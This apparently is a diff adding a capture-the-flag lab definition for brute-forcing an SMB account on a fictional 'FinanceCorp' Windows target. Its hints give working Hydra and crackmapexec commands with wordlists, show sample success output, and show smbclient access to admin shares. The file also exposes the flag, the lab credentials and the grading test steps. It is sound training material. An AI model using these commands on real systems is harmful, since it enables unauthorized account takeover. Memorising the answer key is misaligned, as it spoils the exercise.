@@ -1,0 +1,252 @@
+name: SMB Single User Brute Force
+description: Use automated brute force techniques against FinanceCorp SMB to test password strength for known usernames.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - brute force password for known username
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your credential testing for FinanceCorp has identified several valid usernames. 
+  James Mitchell wants to understand if automated brute force attacks could compromise 
+  accounts, as this represents a significant security risk.
+  
+  Brute force attacks test password strength by systematically attempting many 
+  password combinations. FinanceCorp needs to know if their password policies are 
+  sufficient to resist such attacks.
+  
+  Your objective: Perform automated brute force attacks against FinanceCorp's SMB 
+  service using known usernames. Test password strength and identify if weak 
+  passwords can be discovered through brute forcing.
+
+flag: "OCR{smb_s1ngl3_brut3}"
+
+hints:
+  - text: |
+      **Brute force attacks** systematically test all passwords from a wordlist against a target account. Unlike manual testing, automated brute forcing can test thousands of passwords quickly.
+
+      **Why brute force is effective:**
+      - **Automation**: Tests thousands of passwords automatically
+      - **Coverage**: Exhaustive testing of password lists
+      - **Common passwords**: Most users choose predictable passwords
+      - **Speed**: Much faster than manual testing
+      - **Success rate**: High against weak passwords
+
+      **Risks and considerations:**
+      - **Account lockout**: May trigger lockout after failed attempts
+      - **Detection**: Generates authentication logs
+      - **Network traffic**: Noisy attack, easily detected
+      - **Time**: Can take hours/days for complex passwords
+      - **Legal**: Only perform with authorization
+
+      Brute forcing is most effective when password policies are weak or nonexistent.
+    unlock_after_minutes: 0
+
+  - text: |
+      **Hydra** is the standard tool for network service brute forcing:
+
+      **Hydra capabilities:**
+      - Supports SMB, SSH, HTTP, FTP, and 50+ protocols
+      - Multi-threaded (parallel password testing)
+      - Flexible wordlist support
+      - Pause and resume attacks
+      - Detailed output and logging
+
+      **Key features:**
+      - `-l username`: Single username
+      - `-L userlist.txt`: Username list
+      - `-p password`: Single password
+      - `-P passlist.txt`: Password wordlist
+      - `-t threads`: Number of parallel tasks
+      - `-V`: Verbose output (show attempts)
+      - `-f`: Stop when credentials found
+
+      **Alternative tools:**
+      - **Medusa**: Similar to Hydra, sometimes faster
+      - **Crackmapexec**: Modern SMB-focused tool
+      - **Ncrack**: Nmap's cracking tool
+      - **Custom scripts**: Bash/Python loops
+
+      Hydra is the most versatile and widely used brute force tool.
+    unlock_after_minutes: 5
+
+  - text: |
+      **Brute force attack workflow:**
+
+      1. **Gather usernames**: From enumeration or guessing
+      2. **Select wordlist**: Choose appropriate password list
+      3. **Check password policy**: Avoid lockout if possible
+      4. **Configure tool**: Set threads, timeouts
+      5. **Launch attack**: Begin brute forcing
+      6. **Monitor progress**: Watch for successful hits
+      7. **Document results**: Record valid credentials
+
+      **Password wordlist selection:**
+      - **Small lists** (100-1000): Quick, common passwords
+      - **Medium lists** (10,000): Good balance
+      - **Large lists** (millions): Rockyou.txt, comprehensive
+      - **Custom lists**: Organization-specific passwords
+
+      **Best practices:**
+      - Start with small, targeted lists
+      - Use `/usr/share/wordlists/` on Kali Linux
+      - Create custom lists based on target knowledge
+      - Monitor for account lockout
+      - Use appropriate thread count (1-4 for SMB)
+
+      Smaller, targeted wordlists are more efficient than massive lists.
+    unlock_after_minutes: 10
+
+  - text: |
+      **Hydra SMB brute force syntax:**
+
+      ```bash
+      hydra -l username -P passwordlist.txt smb://target
+      ```
+
+      **Common options:**
+      ```bash
+      # Basic SMB brute force
+      hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://target
+
+      # With verbose output
+      hydra -l admin -P passwords.txt smb://target -V
+
+      # Multiple threads (faster but noisier)
+      hydra -l admin -P passwords.txt -t 4 smb://target
+
+      # Stop at first success
+      hydra -l admin -P passwords.txt smb://target -f
+
+      # Test specific domain
+      hydra -l admin -P passwords.txt smb://target -m DOMAIN
+      ```
+
+      **Using crackmapexec (modern alternative):**
+      ```bash
+      crackmapexec smb target -u administrator -p passwords.txt
+      ```
+
+      **Flags explained:**
+      - `-l`: Single username
+      - `-P`: Password wordlist file
+      - `-V`: Verbose (show each attempt)
+      - `-t`: Thread count
+      - `-f`: Exit on first valid credential
+
+      Hydra will test each password in the wordlist against the specified username.
+    unlock_after_minutes: 15
+
+  - text: |
+      To brute force FinanceCorp's SMB service:
+
+      **Create a small password wordlist:**
+      ```bash
+      cat > passwords.txt <<EOF
+      password
+      admin
+      Password123
+      Admin123
+      Finance2024
+      administrator
+      Pa$$w0rd
+      EOF
+      ```
+
+      **Basic brute force attack:**
+      ```bash
+      hydra -l administrator -P passwords.txt smb://<target>
+      ```
+
+      **With verbose output to see progress:**
+      ```bash
+      hydra -l administrator -P passwords.txt smb://<target> -V
+      ```
+
+      **Using system wordlist:**
+      ```bash
+      hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<target> -t 2 -f
+      ```
+
+      **Using crackmapexec:**
+      ```bash
+      crackmapexec smb <target> -u administrator -p passwords.txt
+      ```
+
+      Hydra will automatically test each password and report when valid credentials are found.
+    unlock_after_minutes: 20
+
+  - text: |
+      Successful brute force attack output:
+
+      ```bash
+      $ hydra -l administrator -P passwords.txt smb://<target_ip> -V
+      Hydra v9.5 starting...
+      [DATA] max 16 tasks per 1 server, overall 16 tasks, 7 login tries (l:1/p:7)
+      [DATA] attacking smb://<target_ip>:445/
+      [ATTEMPT] target <target_ip> - login "administrator" - pass "password" - 1 of 7
+      [ATTEMPT] target <target_ip> - login "administrator" - pass "admin" - 2 of 7
+      [445][smb] host: <target_ip>   login: administrator   password: admin
+      [STATUS] attack finished for <target_ip>
+      1 of 1 target successfully completed, 1 valid password found
+      ```
+
+      **Key output elements:**
+      - `[ATTEMPT]`: Each password being tested (with `-V`)
+      - `[445][smb] host:...`: **SUCCESS** - valid credentials found
+      - `login:` and `password:`: The working combination
+
+      **Crackmapexec output:**
+      ```bash
+      $ crackmapexec smb <target_ip> -u administrator -p passwords.txt
+      SMB         <target_ip>     445    WIN-SERVER      [*] Windows Server 2016
+      SMB         <target_ip>     445    WIN-SERVER      [-] DOMAIN\administrator:password
+      SMB         <target_ip>     445    WIN-SERVER      [+] DOMAIN\administrator:admin
+      ```
+
+      The `[+]` indicates successful authentication.
+
+      **What to document:**
+      - Valid username/password combination
+      - Number of attempts before success
+      - Time taken to crack
+      - Tool and wordlist used
+      - Account lockout behavior (if any)
+
+      **Using discovered credentials:**
+      ```bash
+      # Verify the credentials
+      smbclient -L //<target> -U administrator%admin
+
+      # Access shares
+      smbclient //<target>/C$ -U administrator%admin
+
+      # Enumerate with crackmapexec
+      crackmapexec smb <target> -u administrator -p admin --shares
+      ```
+
+      The flag is accessible after successfully brute forcing valid credentials. Use hydra with a password wordlist to discover the correct password.
+    unlock_after_minutes: 25
+workbook: "wiki/range/winpt/CH03_SMB_Credential_Attacks/03_Single_User_Brute_Force/"
+
+credentials:
+  - username: "admin"
+    password: "qwerty"
+    role: "smb-user"
+    description: "SMB authenticated user"
+
+test:
+  steps:
+    - name: "Verify SMB port 445 is open"
+      command: "nmap -Pn -p 445 {target.target} | grep '445/tcp'"
+      expect: "open"
+
+    - name: "Authenticate to SMB with brute-forced credentials"
+      command: "smbclient //{target.target}/private -U '{cred.smb-user.user}%{cred.smb-user.pass}' -c 'ls' 2>&1"
+      expect: "flag.txt"
+
+    - name: "Retrieve flag from SMB private share"
+      command: "smbclient //{target.target}/private -U '{cred.smb-user.user}%{cred.smb-user.pass}' -c 'get flag.txt -' 2>/dev/null"
+      expect: "OCR{"
